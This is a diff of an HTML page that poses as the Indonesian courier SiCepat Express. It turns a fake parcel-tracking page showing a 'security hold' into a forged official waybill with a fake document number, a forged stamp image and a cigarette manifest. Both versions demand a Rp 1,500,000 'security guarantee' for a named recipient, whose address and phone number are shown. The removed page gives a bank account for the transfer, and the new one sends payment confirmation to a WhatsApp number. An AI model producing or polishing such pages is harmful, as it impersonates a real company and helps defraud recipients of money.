@@ -3,283 +3,355 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Global Tracking Hub | PT. SiCepat Express Indonesia</title>
-  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
+  <title>Dokumen Resmi Perusahaan | PT. SiCepat Express Indonesia</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Source+Serif+Pro:wght@600&display=swap" rel="stylesheet">
   <style>
     :root {
-      --sc-red: #e51a25;
-      --sc-dark: #0f172a;
-      --sc-navy: #1e293b;
-      --sc-gray: #64748b;
-      --sc-success: #10b981;
-      --sc-bg: #f1f5f9;
-      --glass: rgba(255, 255, 255, 0.95);
+      --primary: #e51a25;
+      --dark: #1a1a1a;
+      --gray-900: #212529;
+      --gray-700: #495057;
+      --gray-500: #adb5bd;
+      --gray-300: #dee2e6;
+      --gray-100: #f8f9fa;
+      --border: #e9ecef;
     }
 
-    * { box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
-    body { background: var(--sc-bg); margin: 0; padding: 0; color: var(--sc-dark); overflow-x: hidden; }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: #f9fafb;
+      color: var(--gray-900);
+      line-height: 1.6;
+      padding: 25px;
+      position: relative;
+    }
 
-    /* Navbar Premium */
-    .navbar {
-      background: var(--glass);
-      backdrop-filter: blur(10px);
-      padding: 15px 50px;
+    /* Watermark Anti-Pemalsuan */
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-image: url('https://i.ibb.co.com/ynTPqdF9/IMG-20260117-110547.jpg');
+      background-size: 280px;
+      background-repeat: repeat;
+      opacity: 0.05;
+      z-index: -1;
+      pointer-events: none;
+    }
+
+    .document-container {
+      max-width: 850px;
+      margin: 0 auto;
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.06);
+      overflow: hidden;
+      border-top: 4px solid var(--primary);
+      font-size: 14px;
+    }
+
+    /* Header Resmi Perusahaan */
+    .header {
+      padding: 28px 40px;
       display: flex;
       justify-content: space-between;
       align-items: center;
-      position: sticky;
-      top: 0; z-index: 1000;
-      border-bottom: 1px solid #e2e8f0;
+      border-bottom: 1px solid var(--border);
     }
-    .logo { height: 40px; }
+    .logo {
+      height: 48px;
+    }
+    .doc-meta {
+      text-align: right;
+      font-size: 12px;
+      color: var(--gray-700);
+    }
+    .doc-number {
+      font-weight: 700;
+      color: var(--primary);
+      letter-spacing: 0.5px;
+    }
 
-    /* Hero Tracking Section */
-    .hero-tracking {
-      background: linear-gradient(135deg, var(--sc-dark) 0%, var(--sc-navy) 100%);
-      padding: 80px 20px;
+    /* Judul Dokumen */
+    .doc-title {
+      font-family: 'Source Serif Pro', serif;
+      font-size: 22px;
+      font-weight: 600;
       text-align: center;
-      color: white;
+      margin: 24px 0;
+      color: var(--dark);
+      letter-spacing: 0.3px;
     }
-    .search-container {
-      max-width: 650px;
-      margin: 30px auto;
-      background: white;
+
+    /* Section Umum */
+    .section {
+      padding: 0 40px 28px;
+    }
+    .section-title {
+      font-size: 15px;
+      font-weight: 700;
+      margin: 22px 0 14px;
+      color: var(--primary);
+      padding-bottom: 6px;
+      border-bottom: 1px solid var(--gray-300);
+    }
+
+    /* Grid Info */
+    .info-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 28px;
+      margin: 16px 0;
+    }
+    .info-card h4 {
+      font-size: 13px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      color: var(--gray-700);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    .info-card p {
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    /* Tabel Manifest */
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 18px 0;
+      font-size: 13px;
+    }
+    th, td {
+      padding: 11px 12px;
+      text-align: left;
+      border-bottom: 1px solid var(--gray-300);
+    }
+    th {
+      background-color: var(--gray-100);
+      font-weight: 600;
+      color: var(--gray-700);
+      font-size: 12px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    /* Kotak Jaminan */
+    .guarantee-box {
+      background-color: #fff8f8;
+      border: 1px solid #ffe0e0;
+      border-radius: 6px;
+      padding: 20px;
+      margin: 24px 0;
+    }
+    .guarantee-amount {
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--primary);
+      margin: 10px 0;
+      font-family: 'Source Serif Pro', serif;
+    }
+    .guarantee-note {
+      font-size: 13px;
+      color: var(--gray-700);
+      margin-top: 12px;
+      padding-top: 12px;
+      border-top: 1px dashed var(--gray-300);
+    }
+
+    /* Barcode & QR */
+    .barcode-section {
+      text-align: center;
+      margin: 28px 0;
+    }
+    .barcode-img {
+      width: 200px;
+      height: auto;
+      border: 1px solid var(--gray-300);
       padding: 8px;
-      border-radius: 16px;
-      display: flex;
-      box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+      background: white;
+      margin: 0 auto;
     }
-    .search-input {
-      flex: 1; border: none; padding: 15px 20px; outline: none;
-      font-size: 16px; color: var(--sc-dark); border-radius: 12px;
+    .qris-link {
+      display: inline-block;
+      margin-top: 16px;
+      color: var(--primary);
+      text-decoration: none;
+      font-weight: 600;
+      font-size: 13px;
     }
-    .btn-search {
-      background: var(--sc-red); color: white; border: none;
-      padding: 0 35px; border-radius: 12px; font-weight: 700;
-      cursor: pointer; transition: 0.3s;
-    }
-    .btn-search:hover { background: #c4121a; }
+    .qris-link:hover { text-decoration: underline; }
 
-    /* Result Container */
-    .result-wrapper {
-      max-width: 1100px;
-      margin: -50px auto 50px;
-      display: none; /* Muncul setelah search */
-      animation: fadeInUp 0.6s ease forwards;
+    /* Materai Digital */
+    .digital-stamp {
+      text-align: center;
+      margin-top: 30px;
+      padding-top: 22px;
+      border-top: 1px solid var(--border);
     }
-
-    @keyframes fadeInUp {
-      from { opacity: 0; transform: translateY(30px); }
-      to { opacity: 1; transform: translateY(0); }
+    .stamp-img {
+      width: 120px;
+      height: auto;
+      opacity: 0.98;
     }
-
-    .main-card {
-      background: white; border-radius: 24px; overflow: hidden;
-      box-shadow: 0 25px 50px -12px rgba(0,0,0,0.1);
-      display: grid; grid-template-columns: 1fr 380px;
+    .stamp-label {
+      font-size: 11px;
+      color: var(--gray-700);
+      margin-top: 8px;
+      font-style: italic;
     }
 
-    /* Left Content */
-    .tracking-content { padding: 40px; border-right: 1px solid #f1f5f9; }
-    .status-header {
-      display: flex; justify-content: space-between; align-items: flex-start;
-      margin-bottom: 40px; padding-bottom: 20px; border-bottom: 1px solid #f1f5f9;
+    /* Tombol Konfirmasi */
+    .btn-confirm {
+      display: block;
+      width: 100%;
+      max-width: 280px;
+      margin: 24px auto;
+      padding: 13px 0;
+      background: var(--primary);
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-weight: 600;
+      font-size: 14px;
+      text-align: center;
+      text-decoration: none;
+      transition: opacity 0.2s;
+    }
+    .btn-confirm:hover {
+      opacity: 0.92;
     }
 
-    /* Progress UI */
-    .progress-track {
-      display: flex; justify-content: space-between; margin-bottom: 50px;
-      position: relative;
+    /* Footer Legal */
+    .footer {
+      text-align: center;
+      font-size: 11px;
+      color: var(--gray-700);
+      padding: 20px 40px;
+      border-top: 1px solid var(--border);
+      line-height: 1.5;
     }
-    .progress-track::before {
-      content: ''; position: absolute; top: 20px; left: 0; right: 0;
-      height: 4px; background: #f1f5f9; z-index: 1;
-    }
-    .p-step { position: relative; z-index: 2; text-align: center; width: 100px; }
-    .p-icon {
-      width: 40px; height: 40px; background: white; border: 4px solid #f1f5f9;
-      border-radius: 50%; margin: 0 auto 10px; display: flex; align-items: center;
-      justify-content: center; font-weight: 800; font-size: 14px;
-    }
-    .p-step.done .p-icon { border-color: var(--sc-success); color: var(--sc-success); }
-    .p-step.current .p-icon { border-color: var(--sc-red); background: var(--sc-red); color: white; }
-
-    /* Right Sidebar Tracking */
-    .tracking-sidebar { background: #fafafa; padding: 40px; }
-    .timeline { position: relative; padding-left: 25px; }
-    .timeline::before {
-      content: ''; position: absolute; left: 0; top: 0; bottom: 0;
-      width: 2px; background: #e2e8f0;
-    }
-    .t-item { position: relative; margin-bottom: 30px; }
-    .t-item::after {
-      content: ''; position: absolute; left: -29px; top: 5px;
-      width: 10px; height: 10px; border-radius: 50%; background: #cbd5e1;
-      border: 3px solid #fafafa;
-    }
-    .t-item.active::after { background: var(--sc-red); box-shadow: 0 0 10px var(--sc-red); }
-    
-    .t-date { font-size: 11px; font-weight: 700; color: var(--sc-gray); }
-    .t-info { font-size: 14px; font-weight: 700; margin: 4px 0; }
-    .t-loc { font-size: 12px; color: var(--sc-gray); font-family: 'JetBrains Mono'; }
-
-    /* Notification Modal */
-    .modal-secure {
-      display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8);
-      z-index: 2000; align-items: center; justify-content: center; backdrop-filter: blur(8px);
-    }
-    .modal-box {
-      background: white; width: 500px; border-radius: 24px; padding: 40px;
-      text-align: center; position: relative;
-    }
-
-    .btn-action {
-      background: var(--sc-red); color: white; border: none; padding: 18px;
-      width: 100%; border-radius: 12px; font-weight: 800; cursor: pointer;
-      margin-top: 20px; transition: 0.3s;
+    .footer a {
+      color: var(--primary);
+      text-decoration: none;
     }
 
     @media print {
-      .hero-tracking, .navbar, .btn-action { display: none; }
-      .result-wrapper { margin: 0; display: block; }
-      .main-card { grid-template-columns: 1fr; border: none; box-shadow: none; }
+      body { background: white; padding: 0; }
+      body::before { opacity: 0.03; }
+      .btn-confirm, .qris-link { display: none; }
+      .document-container { box-shadow: none; border-radius: 0; }
     }
   </style>
 </head>
 <body>
 
-  <nav class="navbar">
-    <img src="https://i.ibb.co.com/r12TQVg/IMG-0244.jpg" alt="SiCepat" class="logo">
-    <div style="font-size: 12px; font-weight: 700; color: var(--sc-gray);">ID-GATEWAY-OFFICIAL v4.5</div>
-  </nav>
-
-  <section class="hero-tracking">
-    <h1 style="font-size: 40px; font-weight: 800; margin-bottom: 10px;">Lacak Pengiriman Anda</h1>
-    <p style="opacity: 0.7; font-size: 16px;">Pantau status paket secara real-time dengan sistem enkripsi tingkat tinggi.</p>
-    
-    <div class="search-container">
-      <input type="text" id="resiInput" class="search-input" placeholder="Masukkan Nomor Resi (Contoh: 001797572739)">
-      <button class="btn-search" onclick="trackResi()">LACAK PAKET</button>
+  <div class="document-container">
+    <!-- Header Resmi -->
+    <div class="header">
+      <img src="https://i.ibb.co.com/9HyV9Bky/IMG-20260126-155359.jpg" alt="PT. SiCepat Express Indonesia" class="logo">
+      <div class="doc-meta">
+        <div class="doc-number">DOC/SCEP/R2N/2026/042</div>
+        <div>06 Februari 2026 | 18:05 WIB</div>
+        <div>Kode Verifikasi: SIC-99827-2026</div>
+      </div>
     </div>
-  </section>
 
-  <div class="result-wrapper" id="resultArea">
-    <div class="main-card">
-      <div class="tracking-content">
-        <div class="status-header">
-          <div>
-            <div style="font-size: 12px; font-weight: 800; color: var(--sc-red);">NOMOR RESI</div>
-            <div id="displayResi" style="font-size: 28px; font-weight: 900; letter-spacing: -1px;">001797572739</div>
-          </div>
-          <div style="text-align: right;">
-            <div style="font-size: 11px; font-weight: 800; color: var(--sc-gray);">STATUS TERAKHIR</div>
-            <div style="background: #fff0f0; color: var(--sc-red); padding: 5px 15px; border-radius: 8px; font-weight: 800; font-size: 13px; margin-top: 5px;">HOLD (SECURITY BLOCK)</div>
-          </div>
+    <!-- Judul Dokumen -->
+    <div class="doc-title">SURAT JALAN RESMI DAN SURAT JAMINAN KEAMANAN PERJALANAN</div>
+
+    <div class="section">
+      <!-- Identitas Pengiriman -->
+      <div class="info-grid">
+        <div class="info-card">
+          <h4>PENGIRIM (SHIPPER)</h4>
+          <p><strong>R2 Nusantara</strong><br>
+          Jl. Raya Utama No. 88<br>
+          Malang, Jawa Timur 65111<br>
+          Kontak: (+62) 857-1590-5079</p>
         </div>
-
-        <div class="progress-track">
-          <div class="p-step done"><div class="p-icon">✓</div><small>Diterima</small></div>
-          <div class="p-step done"><div class="p-icon">✓</div><small>Transit</small></div>
-          <div class="p-step current"><div class="p-icon">!</div><small>Otoritas</small></div>
-          <div class="p-step"><div class="p-icon">3</div><small>Kurir</small></div>
-          <div class="p-step"><div class="p-icon">4</div><small>Tujuan</small></div>
-        </div>
-
-        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 30px; margin-top: 40px;">
-          <div>
-            <div style="font-size: 11px; font-weight: 800; color: var(--sc-gray); margin-bottom: 8px;">PENGIRIM</div>
-            <p><strong>R2 Nusantara</strong><br>Malang, Jawa Timur</p>
-          </div>
-          <div style="text-align: right;">
-            <div style="font-size: 11px; font-weight: 800; color: var(--sc-gray); margin-bottom: 8px;">PENERIMA (TUJUAN)</div>
-            <p><strong>Fahru Rahman K</strong><br>Dusun Timur, Desa Waro, Kec. Monta<br>Kab. Bima, NTB 84172</p>
-          </div>
-        </div>
-
-        <div style="background: #f8fafc; border: 1px solid #e2e8f0; padding: 25px; border-radius: 20px; margin-top: 40px; display: flex; gap: 20px; align-items: center;">
-          <div style="font-size: 30px;">🛡️</div>
-          <div>
-            <strong style="color: var(--sc-red);">Sistem Keamanan Diaktifkan</strong>
-            <p style="font-size: 13px; margin: 5px 0 0 0; color: var(--sc-gray);">Paket tertahan di <b>Gateway Surabaya</b> karena muatan khusus. Jaminan keamanan perjalanan sebesar <b>Rp 1.500.000</b> diperlukan untuk melanjutkan pengiriman ke NTB.</p>
-          </div>
+        <div class="info-card">
+          <h4>PENERIMA (CONSIGNEE)</h4>
+          <p><strong>Fahru Rahman K</strong><br>
+          RT.006 / RW.003, Dusun Timur, Desa Waro<br>
+          Kec. Monta, Kab. Bima, NTB 84172<br>
+          HP: (+62) 821-4545-0288</p>
         </div>
       </div>
 
-      <aside class="tracking-sidebar">
-        <h3 style="margin: 0 0 30px 0; font-size: 18px; font-weight: 800;">Riwayat Perjalanan</h3>
-        <div class="timeline">
-          <div class="t-item active">
-            <div class="t-date">06 FEB 2026 - 18:05</div>
-            <div class="t-info" style="color: var(--sc-red);">HOLD: SECURITY GATEWAY</div>
-            <div class="t-loc">GATEWAY SURABAYA (INTERNAL)</div>
-          </div>
-          <div class="t-item">
-            <div class="t-date">06 FEB 2026 - 14:20</div>
-            <div class="t-info">MASUK PUSAT SORTIR</div>
-            <div class="t-loc">HUB WAREHOUSE JAWA TIMUR</div>
-          </div>
-          <div class="t-item">
-            <div class="t-date">06 FEB 2026 - 09:12</div>
-            <div class="t-info">PENJEMPUTAN SUKSES</div>
-            <div class="t-loc">ORIGIN: MALANG (MLG-01)</div>
-          </div>
-        </div>
-        
-        <button class="btn-action" onclick="showModal()">SELESAIKAN JAMINAN</button>
-        <button class="btn-action" style="background: transparent; color: var(--sc-dark); border: 2px solid #e2e8f0; margin-top: 10px;" onclick="window.print()">UNDUH SURAT JALAN</button>
-      </aside>
-    </div>
-  </div>
+      <!-- Manifest Barang -->
+      <div class="section-title">MANIFEST BARANG</div>
+      <table>
+        <thead>
+          <tr>
+            <th>No.</th>
+            <th>Deskripsi Barang</th>
+            <th>Qty</th>
+            <th>Satuan</th>
+            <th>Berat (kg)</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td>1</td><td>ROKOK PS DJERAM</td><td>60</td><td>Slop</td><td>18.0</td></tr>
+          <tr><td>2</td><td>PS FILTER</td><td>60</td><td>Slop</td><td>15.0</td></tr>
+          <tr><td>3</td><td>PS DJERAM</td><td>120</td><td>Slop</td><td>30.0</td></tr>
+          <tr>
+            <td colspan="4" style="text-align: right; font-weight: 600;">TOTAL BERAT:</td>
+            <td style="font-weight: 600;">63.0 kg</td>
+          </tr>
+        </tbody>
+      </table>
 
-  <div id="modalSecure" class="modal-secure">
-    <div class="modal-box">
-      <h2 style="font-weight: 900; margin-bottom: 10px;">VALIDASI OTORITAS</h2>
-      <p style="color: var(--sc-gray); font-size: 14px;">Silakan selesaikan jaminan keamanan resmi untuk melepas blokir pada Resi <b id="modalResi"></b></p>
-      
-      <div style="background: #f1f5f9; padding: 25px; border-radius: 20px; text-align: left; margin: 30px 0;">
-        <div style="font-size: 11px; font-weight: 800; color: var(--sc-gray);">NOMOR REKENING JAMINAN</div>
-        <div style="font-size: 20px; font-weight: 900; margin: 5px 0;">144-00-2277-XXX-A</div>
-        <div style="font-size: 12px; font-weight: 600;">BANK MANDIRI / A.N SICEPAT EXPRESS</div>
-        <hr style="border: 0; border-top: 1px solid #cbd5e1; margin: 15px 0;">
-        <div style="font-size: 11px; font-weight: 800; color: var(--sc-gray);">JUMLAH TRANSFER (KODE UNIK)</div>
-        <div style="font-size: 24px; font-weight: 900; color: var(--sc-red);">Rp 1.500.739</div>
+      <!-- Jaminan Keamanan -->
+      <div class="section-title">JAMINAN KEAMANAN PERJALANAN</div>
+      <div class="guarantee-box">
+        <p>PT. SiCepat Express Indonesia menerima jaminan keamanan perjalanan sebesar:</p>
+        <div class="guarantee-amount">Rp 1.500.000,- (Satu Juta Lima Ratus Ribu Rupiah)</div>
+        <p>Jaminan ini bersifat <strong>sementara dan 100% refundable</strong> setelah barang tiba di tujuan dalam kondisi utuh dan dokumen ini dikembalikan ke kantor cabang SiCepat terdekat.</p>
+        <div class="guarantee-note">
+          • Tidak berlaku sebagai premi asuransi atau biaya administrasi.<br>
+          • Pengembalian dana maksimal 3 hari kerja setelah verifikasi penerimaan.
+        </div>
       </div>
 
-      <button class="btn-action" onclick="alert('Menghubungkan ke API Verifikasi Bank...')">KONFIRMASI PEMBAYARAN</button>
-      <p style="margin-top: 15px; font-size: 12px; color: var(--sc-gray); cursor: pointer;" onclick="hideModal()">Kembali ke Pelacakan</p>
+      <!-- Barcode & QRIS -->
+      <div class="barcode-section">
+        <img src="https://i.ibb.co/Mx9xmsCV/IMG-20260206-180618.jpg" alt="Barcode Resi" class="barcode-img">
+        <p style="font-size: 12px; color: var(--gray-700); margin-top: 10px;">Nomor Resi: SCEP/R2N/2026/042</p>
+        <a href="https://wa.me/62881010104981?text=Konfirmasi%20Jaminan%20Resi%20SCEP%2FR2N%2F2026%2F042%20-%20Rp1.500.000" 
+           target="_blank" 
+           class="qris-link">
+          [Lihat Instruksi Pembayaran QRIS]
+        </a>
+      </div>
+
+      <!-- Tombol Konfirmasi -->
+      <a href="https://wa.me/62881010104981?text=Konfirmasi%20Jaminan%20Resi%20SCEP%2FR2N%2F2026%2F042%20-%20Rp1.500.000" 
+         target="_blank" 
+         class="btn-confirm">
+        KONFIRMASI PEMBAYARAN JAMINAN
+      </a>
+
+      <!-- Materai Digital -->
+      <div class="digital-stamp">
+        <img src="https://i.ibb.co.com/fGqwXhMb/1000014472-11zon.jpg" alt="Materai Digital Resmi" class="stamp-img">
+        <div class="stamp-label">Materai Digital Resmi – Validasi Elektronik Terenkripsi</div>
+      </div>
+    </div>
+
+    <!-- Footer Legal -->
+    <div class="footer">
+      <p>Dokumen ini merupakan bagian dari sistem manajemen logistik terintegrasi PT. SiCepat Express Indonesia.<br>
+      Berlaku sah jika dicetak utuh, tidak diubah, dan memiliki cap waktu digital serta materai elektronik resmi.</p>
+      <p>© 2026 PT. SiCepat Express Indonesia. All Rights Reserved<br>
+      Kantor Pusat: Jakarta | Website: <a href="https://www.sicepat.com" target="_blank">www.sicepat.com</a> | Call Center: 1500-111</p>
     </div>
   </div>
 
-  <footer style="padding: 40px; text-align: center; color: var(--sc-gray); font-size: 12px; border-top: 1px solid #e2e8f0;">
-    © 2026 PT. SiCepat Express Indonesia. Seluruh data dilindungi sistem enkripsi militer.
-  </footer>
-
-  <script>
-    function trackResi() {
-      const input = document.getElementById('resiInput').value;
-      const display = document.getElementById('displayResi');
-      const result = document.getElementById('resultArea');
-      
-      if(input === "001797572739") {
-        display.innerText = input;
-        result.style.display = "block";
-        window.scrollTo({ top: 400, behavior: 'smooth' });
-      } else if(input === "") {
-        alert("Mohon masukkan nomor resi.");
-      } else {
-        alert("Nomor resi tidak ditemukan atau dalam proses sinkronisasi database.");
-      }
-    }
-
-    function showModal() {
-      const input = document.getElementById('resiInput').value;
-      document.getElementById('modalResi').innerText = input || "001797572739";
-      document.getElementById('modalSecure').style.display = "flex";
-    }
-
-    function hideModal() {
-      document.getElementById('modalSecure').style.display = "none";
-    }
-  </script>
 </body>
 </html>
